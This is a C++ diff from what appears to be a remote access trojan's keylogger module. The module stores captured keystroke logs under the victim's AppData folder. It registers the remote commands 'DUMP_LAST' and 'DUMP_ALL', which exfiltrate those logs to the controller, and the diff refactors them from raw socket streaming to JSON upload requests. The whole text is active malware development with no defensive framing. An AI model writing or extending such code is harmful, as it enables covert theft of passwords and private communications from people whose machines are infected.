@@ -177,48 +177,36 @@ bool KeyLogger::logsExists() const {
 
 }
 
-void KeyLogger::setStream(const Stream & stream){
-    this->stream=stream;
-}
-
-void KeyLogger::send() {
-    sendLastKeyloggerLog();
-}
-
-void KeyLogger::sendLastKeyloggerLog() {
-    if (lastLogExists()) {
-        stream.sendSize(1);
-        stream.sendFile(logsFileName.c_str());
-        logsFileName = generateLogName();
-    } else {
-        stream.sendSize(-1);
+void KeyLogger::sendLastKeyloggerLog(nlohmann::json json) {
+    if (lastLogExists()){
+        nlohmann::json jsonObject;
+        jsonObject["from_path"] = Converter::wstring2string(logsFileName);
+        jsonObject["channel_id"] = json["channel_id"];
+        download.downloadContent(jsonObject);
     }
 }
 
-void KeyLogger::sendAll() {
-    if (logsExists()) {
-        stream.sendSize(1);
-        for (const auto &entry: std::filesystem::directory_iterator(pathOfLogs)) {
-            stream.sendSize(0);
-            if (std::filesystem::is_regular_file(entry)) stream.sendFile(entry.path().wstring().c_str());
-            stream.readSize();
-        }
-        stream.sendSize(-1);
-    } else {
-        stream.sendSize(-1);
+void KeyLogger::sendAll(nlohmann::json json) {
+    if (logsExists()){
+        nlohmann::json jsonObject;
+        jsonObject["from_path"] = Converter::wstring2string(pathOfLogs);
+        jsonObject["channel_id"] = json["channel_id"];
+        download.downloadContent(jsonObject);
     }
 }
 
 
-KeyLogger::KeyLogger(const Stream & stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap) : Sender(stream, actionMap) {
+KeyLogger::KeyLogger(ClientSocket &clientSocket, Download &download)
+        : Handler(clientSocket), download(download) {
 #ifdef KEYLOGGER_DEF
     pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER_DEF) + L"\\";
     logsFileName = generateLogName();
+    ActionMap& actionMap = clientSocket.getActionMap();
     actionMap["DUMP_LAST"] =[&](nlohmann::json& json) {
-        threadGen.runInNewThread(this, &KeyLogger::send);
+        threadGen.runInNewThread(this, &KeyLogger::sendLastKeyloggerLog, json);
     };
     actionMap["DUMP_ALL"] =[&](nlohmann::json& json) {
-        threadGen.runInNewThread(this, &KeyLogger::sendAll);
+        threadGen.runInNewThread(this, &KeyLogger::sendAll, json);
     };
 
 
